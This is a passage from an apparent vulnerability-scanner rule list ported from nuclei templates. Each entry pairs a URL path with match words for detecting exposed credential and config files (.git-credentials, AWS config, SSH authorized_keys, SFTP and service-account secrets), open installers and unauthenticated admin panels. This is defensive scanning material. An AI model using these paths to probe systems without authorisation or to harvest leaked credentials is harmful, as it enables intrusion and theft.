        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Nova - Unauthenticated Admin Panel Access (ported from nuclei template http/misconfiguration/laravel-nova-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Nova.booting', 'nova-resources', 'nova-login', '/nova/login'], 'condition': 'or'}],
    },
    {
        "id": 'parameters-config', "name": 'Parameters.yml - File Discovery',
        "severity": 'high', "path": '/parameters.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Parameters.yml - File Discovery (ported from nuclei template http/exposures/configs/parameters-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['parameters:', 'database_user', 'database_password'], 'condition': 'or'}],
    },
    {
        "id": 'pmm-installer', "name": 'PMM Installation Wizard',
        "severity": 'high', "path": '/password-page/ovf/account-credentials-ovf',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'PMM Installation Wizard (ported from nuclei template http/misconfiguration/installer/pmm-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['PMM Installation Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'shopware-installer', "name": 'Shopware Installer',
        "severity": 'high', "path": '/public/recovery/install/index.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Shopware Installer (ported from nuclei template http/misconfiguration/installer/shopware-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Setup | Shopware', 'install'], 'condition': 'or'}],
    },
    {
        "id": 'servicestack-requestlogs', "name": 'ServiceStack Request Logs - Unauthenticated Access',
        "severity": 'high', "path": '/requestlogs',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ServiceStack Request Logs - Unauthenticated Access (ported from nuclei template http/exposures/logs/servicestack-requestlogs.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"Results":[', '"Usage":{'], 'condition': 'or'}],
    },
    {
        "id": 'sabnzbd-installer', "name": 'SABnzbd Quick-Start Wizard - Exposure',
        "severity": 'high', "path": '/sabnzbd/wizard/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SABnzbd Quick-Start Wizard - Exposure (ported from nuclei template http/misconfiguration/installer/sabnzbd-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SABnzbd Quick-Start Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'searchreplacedb2-exposure', "name": 'Safe Search Replace Exposure',
        "severity": 'high', "path": '/searchreplacedb2.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Safe Search Replace Exposure (ported from nuclei template http/misconfiguration/searchreplacedb2-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Database details', 'Safe Search Replace'], 'condition': 'or'}],
    },
    {
        "id": 'unauthenticated-prtg', "name": 'PRTG Traffic Grapher - Unauthenticated Access',
        "severity": 'high', "path": '/sensorlist.htm',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'PRTG Traffic Grapher - Unauthenticated Access (ported from nuclei template http/misconfiguration/unauthenticated-prtg.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['PRTG Traffic Grapher'], 'condition': 'or'}],
    },
    {
        "id": 'openemr-setup-installer', "name": 'OpenEMR Setup Installation Page - Exposure',
        "severity": 'high', "path": '/setup.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OpenEMR Setup Installation Page - Exposure (ported from nuclei template http/misconfiguration/installer/openemr-setup-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>OpenEMR Setup Tool</title>'], 'condition': 'or'}],
    },
    {
        "id": 'modx-installer', "name": 'ModX CMS - Unfinished Installation',
        "severity": 'high', "path": '/setup/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ModX CMS - Unfinished Installation (ported from nuclei template http/misconfiguration/installer/modx-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ModX Revolution', 'installer-steps'], 'condition': 'or'}],
    },
    {
        "id": 'openfire-setup', "name": 'Openfire Setup - Exposure',
        "severity": 'high', "path": '/setup/index.jsp',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Openfire Setup - Exposure (ported from nuclei template http/misconfiguration/installer/openfire-setup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Welcome to Openfire Setup'], 'condition': 'or'}],
    },
    {
        "id": 'phpmyfaq-installer', "name": 'phpMyFAQ Installation - Exposure',
        "severity": 'high', "path": '/setup/index.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'phpMyFAQ Installation - Exposure (ported from nuclei template http/misconfiguration/installer/phpmyfaq-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>phpMyFAQ', 'Setup</title>', 'phpmyfaq-setup'], 'condition': 'or'}],
    },
    {
        "id": 'profittrailer-installer', "name": 'ProfitTrailer Setup Page - Exposure',
        "severity": 'high', "path": '/setup/license',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ProfitTrailer Setup Page - Exposure (ported from nuclei template http/misconfiguration/installer/profittrailer-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ProfitTrailer Setup'], 'condition': 'or'}],
    },
    {
        "id": 'azuracast-installer', "name": 'AzuraCast - Unfinished Installation',
        "severity": 'high', "path": '/setup/register',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AzuraCast - Unfinished Installation (ported from nuclei template http/misconfiguration/installer/azuracast-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Set Up AzuraCast', 'SetupRegister'], 'condition': 'or'}],
    },
    {
        "id": 'confluence-installer', "name": 'Confluence Installation Page - Exposure',
        "severity": 'high', "path": '/setup/setupcluster-start.action',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Confluence Installation Page - Exposure (ported from nuclei template http/misconfiguration/installer/confluence-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Choose your deployment type - Confluence'], 'condition': 'or'}],
    },
    {
        "id": 'sftp-credentials-exposure', "name": 'SFTP Configuration File - Credentials Exposure',
        "severity": 'high', "path": '/sftp-config.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SFTP Configuration File - Credentials Exposure (ported from nuclei template http/exposures/configs/sftp-credentials-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"host":', '"user":', '"password":', '"remote_path":', 'file_permissions', 'extra_list_connections'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-sessions-exposure', "name": 'Laravel Sessions Folder Exposure',
        "severity": 'high', "path": '/storage/framework/sessions/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Sessions Folder Exposure (ported from nuclei template http/misconfiguration/laravel-sessions-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of', 'Parent Directory', '<title>Index of', 'Directory listing for'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-log-file', "name": 'Laravel log file publicly accessible',
        "severity": 'high', "path": '/storage/logs/laravel.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel log file publicly accessible (ported from nuclei template http/exposures/logs/laravel-log-file.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['InvalidArgumentException', 'local.ERROR', 'ErrorException', 'syntax error', 'text/x-log'], 'condition': 'or'}],
    },
    {
        "id": 'aem-felix-console', "name": 'Adobe Experience Manager Felix Console - Default Login',
        "severity": 'high', "path": '/system/console/bundles',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Adobe Experience Manager Felix Console - Default Login (ported from nuclei template http/default-logins/aem/aem-felix-console.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Adobe Experience Manager Web Console - Bundles</title>'], 'condition': 'or'}],
    },
    {
        "id": 'osticket-installer', "name": 'osTicket Installer Panel - Detect',
        "severity": 'high', "path": '/upload/setup/install.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'osTicket Installer Panel - Detect (ported from nuclei template http/misconfiguration/installer/osticket-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>osTicket Installer', 'already installed'], 'condition': 'or'}],
    },
    {
        "id": 'openstack-user-secrets', "name": 'OpenStack User Secrets Exposure',
        "severity": 'high', "path": '/user_secrets.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OpenStack User Secrets Exposure (ported from nuclei template http/exposures/files/openstack-user-secrets.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['_password:', 'OpenStack environment'], 'condition': 'or'}],
    },
    {
        "id": 'gitlab-uninitialized-password', "name": 'Uninitialized GitLab instances',
        "severity": 'high', "path": '/users/sign_in',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Uninitialized GitLab instances (ported from nuclei template http/misconfiguration/gitlab/gitlab-uninitialized-password.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Change your password', 'New password', 'Confirm new password', 'gitlab_session'], 'condition': 'or'}],
    },
    {
        "id": 'http-etcd-unauthenticated-api-data-leak', "name": 'etcd Unauthenticated HTTP API Leak',
        "severity": 'high', "path": '/v2/auth/roles',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'etcd Unauthenticated HTTP API Leak (ported from nuclei template http/misconfiguration/etcd-unauthenticated-api.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"roles"', '"permissions"', '"role"', '"kv"'], 'condition': 'or'}],
    },
    {
        "id": 'unauth-etcd-server', "name": 'Etcd Server - Unauthenticated Access',
        "severity": 'high', "path": '/v2/keys/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Etcd Server - Unauthenticated Access (ported from nuclei template http/misconfiguration/kubernetes/unauth-etcd-server.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"node":', '"key":'], 'condition': 'or'}],
    },
    {
        "id": 'ventrilo-config', "name": 'Ventrilo Configuration File - Detect',
        "severity": 'high', "path": '/ventrilo_srv.ini',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Ventrilo Configuration File - Detect (ported from nuclei template http/exposures/configs/ventrilo-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[Server]', 'Phonetic'], 'condition': 'or'}],
    },
    {
        "id": 'selenium-exposure', "name": 'Selenium - Node Exposure',
        "severity": 'high', "path": '/wd/hub',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Selenium - Node Exposure (ported from nuclei template http/misconfiguration/selenium-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['WebDriverRequest', '<title>WebDriver Hub</title>'], 'condition': 'or'}],
    },
    {
        "id": 'sftpgo-admin-setup', "name": 'SFTPGo Admin - Setup',
        "severity": 'high', "path": '/web/admin/setup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SFTPGo Admin - Setup (ported from nuclei template http/misconfiguration/sftpgo-admin-setup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SFTPGo - Setup', 'SFTPGo you need to create an admin user'], 'condition': 'or'}],
    },
    {
        "id": 'lvmeng-uts-disclosure', "name": 'Lvmeng - UTS Disclosure',
        "severity": 'high', "path": '/webapi/v1/system/accountmanage/account',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Lvmeng - UTS Disclosure (ported from nuclei template http/exposures/configs/lvmeng-uts-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['nsfocus_uts', 'MANAGER_IP'], 'condition': 'or'}],
    },
    {
        "id": 'tautulli-install', "name": 'Tautulli - Exposed Installation',
        "severity": 'high', "path": '/welcome',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Tautulli - Exposed Installation (ported from nuclei template http/misconfiguration/installer/tautulli-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Tautulli - Welcome', 'Tautulli Setup Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'invicti-enterprise-installer', "name": 'Invicti Enterprise Installation Page - Exposure',
        "severity": 'high', "path": '/wizard/database/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Invicti Enterprise Installation Page - Exposure (ported from nuclei template http/misconfiguration/installer/invicti-enterprise-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Invicti Enterprise - Installation Wizard'], 'condition': 'or'}],
    },
    {
        "id": 'cube-105-install', "name": 'Cube-105 - Exposed Installation',
        "severity": 'high', "path": '/wizard/wizard.cs',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Cube-105 - Exposed Installation (ported from nuclei template http/misconfiguration/installer/cube-105-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Cube-105 Setup Wizard', 'initial setup'], 'condition': 'or'}],
    },
    {
        "id": 'revive-adserver-installer', "name": 'Revive Adserver - Exposed Installer',
        "severity": 'high', "path": '/www/admin/install.php?action=welcome',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Revive Adserver - Exposed Installer (ported from nuclei template http/misconfiguration/installer/revive-adserver-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Installing Revive Adserver', 'installer'], 'condition': 'or'}],
    },
    {
        "id": 'appveyor-configuration-file', "name": 'AppVeyor Configuration Page - Detect',
        "severity": 'medium', "path": '/.appveyor.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AppVeyor Configuration Page - Detect (ported from nuclei template http/exposures/configs/appveyor-configuration-file.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['install:', 'test_script:'], 'condition': 'or'}],
    },
    {
        "id": 'aws-config', "name": 'AWS Configuration - Detect',
        "severity": 'medium', "path": '/.aws/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AWS Configuration - Detect (ported from nuclei template http/exposures/configs/aws-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[default]'], 'condition': 'or'}],
    },
    {
        "id": 'azure-pipelines-exposed', "name": 'Azure Pipelines Configuration File Disclosure',
        "severity": 'medium', "path": '/.azure-pipelines.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Azure Pipelines Configuration File Disclosure (ported from nuclei template http/exposures/files/azure-pipelines-exposed.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['trigger:', 'pool:', 'variables:'], 'condition': 'or'}],
    },
    {
        "id": 'circleci-ssh-config', "name": 'CircleCI SSH Configuration - Detect',
        "severity": 'medium', "path": '/.circleci/ssh-config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'CircleCI SSH Configuration - Detect (ported from nuclei template http/exposures/configs/circleci-ssh-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Host', 'HostName', 'IdentityFile'], 'condition': 'or'}],
    },
    {
        "id": 'claude-settings-exposure', "name": 'Claude Code Project Settings Exposure',
        "severity": 'medium', "path": '/.claude/settings.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Claude Code Project Settings Exposure (ported from nuclei template http/exposures/configs/claude-settings-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['text/json'], 'condition': 'or'}],
    },
    {
        "id": 'karma-config-js', "name": 'Karma Configuration File - Detect',
        "severity": 'medium', "path": '/.config/karma.conf.js',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Karma Configuration File - Detect (ported from nuclei template http/exposures/configs/karma-config-js.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['// Karma configuration', 'module.exports'], 'condition': 'or'}],
    },
    {
        "id": 'flow-config-exposure', "name": 'Flow Configuration - Exposure',
        "severity": 'medium', "path": '/.flowconfig',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Flow Configuration - Exposure (ported from nuclei template http/exposures/configs/flow-config-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[include]', '[ignore]', 'build'], 'condition': 'or'}],
    },
    {
        "id": 'git-credentials-disclosure', "name": 'Git Credentials - Detect',
        "severity": 'medium', "path": '/.git-credentials',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Git Credentials - Detect (ported from nuclei template http/exposures/configs/git-credentials-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['https://', '@github.com'], 'condition': 'or'}],
    },
    {
        "id": 'git-config', "name": 'Git Configuration - Detect',
        "severity": 'medium', "path": '/.git/config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Git Configuration - Detect (ported from nuclei template http/exposures/configs/git-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[credentials]', '[core]'], 'condition': 'or'}],
    },
    {
        "id": 'gitlab-ci-yml', "name": 'GitLab CI YAML - Exposure',
        "severity": 'medium', "path": '/.gitlab-ci.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'GitLab CI YAML - Exposure (ported from nuclei template http/exposures/files/gitlab-ci-yml.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['variables:', 'before_script:', 'stage: build', 'script:', 'image:', 'releasePath:', 'sshUser:'], 'condition': 'or'}],
    },
    {
        "id": 'exposed-hg', "name": 'HG Configuration - Detect',
        "severity": 'medium', "path": '/.hg/hgrc',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'HG Configuration - Detect (ported from nuclei template http/exposures/configs/exposed-hg.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[paths]', 'default'], 'condition': 'or'}],
    },
    {
        "id": 'ssh-authorized-keys', "name": 'SSH Authorized Keys File - Detect',
        "severity": 'medium', "path": '/.ssh/authorized_keys',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SSH Authorized Keys File - Detect (ported from nuclei template http/exposures/configs/ssh-authorized-keys.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ssh-dss', 'ssh-ed25519', 'ssh-rsa', 'ecdsa-sha2-nistp256'], 'condition': 'or'}],
    },
    {
        "id": 'svn-wc-db', "name": 'SVN wc.db File Exposure',
        "severity": 'medium', "path": '/.svn/wc.db',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SVN wc.db File Exposure (ported from nuclei template http/exposures/files/svn-wc-db.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SQLite format', 'WCROOT'], 'condition': 'or'}],
    },
    {
        "id": 'espeasy-installer', "name": 'ESPEasy Installation Exposure',
        "severity": 'medium', "path": '/ESPEasy',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ESPEasy Installation Exposure (ported from nuclei template http/misconfiguration/installer/espeasy-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Install ESPEasy'], 'condition': 'or'}],
    },
    {
        "id": 'aspnet-launchsettings-exposure', "name": 'ASP.NET Launch Settings - Exposure',
        "severity": 'medium', "path": '/Properties/launchSettings.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ASP.NET Launch Settings - Exposure (ported from nuclei template http/exposures/files/aspnet-launchsettings-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['profiles', 'iisSettings', 'commandName', 'launchBrowser'], 'condition': 'or'}],
    },
    {
        "id": 'jellyfin-public-users-exposure', "name": 'Jellyfin Public Users - Exposure',
        "severity": 'medium', "path": '/Users/Public',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Jellyfin Public Users - Exposure (ported from nuclei template http/misconfiguration/jellyfin-public-users-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"Name"', '"ServerId"', '"Id"', '"Policy"', '"Configuration"'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-clockwork-exposure', "name": 'Laravel Clockwork - Sensitive Information Exposure',
        "severity": 'medium', "path": '/__clockwork',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Clockwork - Sensitive Information Exposure (ported from nuclei template http/misconfiguration/laravel-clockwork-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"__meta":', '"toolbar":'], 'condition': 'or'}],
    },
    {
        "id": 'pyramid-debug-toolbar', "name": 'Pyramid Debug Toolbar',
        "severity": 'medium', "path": '/_debug_toolbar/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Pyramid Debug Toolbar (ported from nuclei template http/exposures/logs/pyramid-debug-toolbar.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Pyramid Debug Toolbar</title>', 'Pyramid DebugToolbar</a>'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-debugbar-exposure', "name": 'Laravel Debugbar - Sensitive Information Exposure',
        "severity": 'medium', "path": '/_debugbar/open',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Debugbar - Sensitive Information Exposure (ported from nuclei template http/misconfiguration/laravel-debugbar-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['debugbar'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-debug-enabled', "name": 'Laravel Debug Enabled',
        "severity": 'medium', "path": '/_ignition/health-check',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Debug Enabled (ported from nuclei template http/misconfiguration/laravel-debug-enabled.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['can_execute_commands'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-ignition-log-viewer', "name": 'Laravel Ignition - Log Viewer Information Disclosure',
        "severity": 'medium', "path": '/_ignition/logs',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Ignition - Log Viewer Information Disclosure (ported from nuclei template http/exposures/logs/laravel-ignition-log-viewer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['{"log_messages"', 'exception'], 'condition': 'or'}],
    },
    {
        "id": 'vercel-source-exposure', "name": 'Vercel Source Code Exposure',
        "severity": 'medium', "path": '/_src',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Vercel Source Code Exposure (ported from nuclei template http/misconfiguration/vercel-source-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Deployment Source</title>', 'Deployment Source – Dashboard – Vercel', '<title>Login – Vercel</title>'], 'condition': 'or'}],
    },
    {
        "id": 'exposed-sharepoint-list', "name": 'Sharepoint List - Detect',
        "severity": 'medium', "path": '/_vti_bin/lists.asmx?WSDL',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Sharepoint List - Detect (ported from nuclei template http/exposures/configs/exposed-sharepoint-list.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['GetListResponse', 'GetList'], 'condition': 'or'}],
    },
    {
        "id": 'gcloud-access-token', "name": 'Google Cloud Access Token',
        "severity": 'medium', "path": '/access_tokens.db',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Google Cloud Access Token (ported from nuclei template http/exposures/files/gcloud-access-token.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SQLite', 'access_token'], 'condition': 'or'}],
    },
    {
        "id": 'amr-printer-management-unauth', "name": 'AMR Printer Management Dashboard - Exposure',
        "severity": 'medium', "path": '/amr',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AMR Printer Management Dashboard - Exposure (ported from nuclei template http/misconfiguration/amr-printer-management-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['AMR Printer Management', '<span>Basic Setup', '<span>Log'], 'condition': 'or'}],
    },
    {
        "id": 'sonarqube-projects-disclosure', "name": 'SonarQube - Information Disclosure',
        "severity": 'medium', "path": '/api/components/search_projects',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SonarQube - Information Disclosure (ported from nuclei template http/misconfiguration/sonarqube-projects-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"visibility":"public"', '{"organization'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-horizon-unauth', "name": 'Laravel Horizon Dashboard - Unauthenticated',
        "severity": 'medium', "path": '/api/stats',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Horizon Dashboard - Unauthenticated (ported from nuclei template http/misconfiguration/laravel-horizon-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['queueWithMaxRuntime', 'recentJobs'], 'condition': 'or'}],
    },
    {
        "id": 'mailpit-app-info-disclosure', "name": 'Mailpit App - Information Disclosure',
        "severity": 'medium', "path": '/api/v1/messages',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Mailpit App - Information Disclosure (ported from nuclei template http/misconfiguration/mailpit-app-info-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"messages":', '"ID":'], 'condition': 'or'}],
    },
    {
        "id": 'apache-pinot-config', "name": 'Apache Pinot - Exposure',
        "severity": 'medium', "path": '/appconfigs',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache Pinot - Exposure (ported from nuclei template http/exposures/configs/apache-pinot-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"systemConfig"', '"pinotConfig"', '"jvmConfig"'], 'condition': 'or'}],
    },
    {
        "id": 'apollo-adminservice-unauth', "name": 'Apollo Admin Service - Unauthenticated Access',
        "severity": 'medium', "path": '/apps',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apollo Admin Service - Unauthenticated Access (ported from nuclei template http/misconfiguration/apollo-adminservice-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['appId', 'orgName', 'ownerName', 'dataChangeCreatedBy'], 'condition': 'or'}],
    },
    {
        "id": 'azure-instrumentation-key-exposure', "name": 'Azure Instrumentation Key - Exposure',
        "severity": 'medium', "path": '/appsettings.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Azure Instrumentation Key - Exposure (ported from nuclei template http/exposures/tokens/azure/azure-instrumentation-key-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['InstrumentationKey', 'APPINSIGHTS_INSTRUMENTATIONKEY', '<InstrumentationKey>'], 'condition': 'or'}],
    },
    {
        "id": 'appspec-yml-disclosure', "name": 'Appspec YML/YAML - Detect',
        "severity": 'medium', "path": '/appspec.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Appspec YML/YAML - Detect (ported from nuclei template http/exposures/configs/appspec-yml-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['version:', 'files:'], 'condition': 'or'}],
    },
    {
        "id": 'jfrog-artifactory-build-exposure', "name": 'JFrog Artifactory Build - Exposure',
        "severity": 'medium', "path": '/artifactory/api/build',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'JFrog Artifactory Build - Exposure (ported from nuclei template http/exposures/configs/jfrog-artifactory-build-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"builds"', '"uri"', '"lastStarted"', 'application/vnd.org.jfrog'], 'condition': 'or'}],
    },
    {
        "id": 'service-account-credentials', "name": 'Service Account Credentials File Disclosure',
        "severity": 'medium', "path": '/assets/other/service-account-credentials.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Service Account Credentials File Disclosure (ported from nuclei template http/exposures/files/service-account-credentials.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"private_key_id":', '"private_key":'], 'condition': 'or'}],
    },
    {
        "id": 'behat-config', "name": 'Behat Configuration File - Detect',
        "severity": 'medium', "path": '/behat.yml',
        "matchers_condition": "and", "origin": "nuclei",
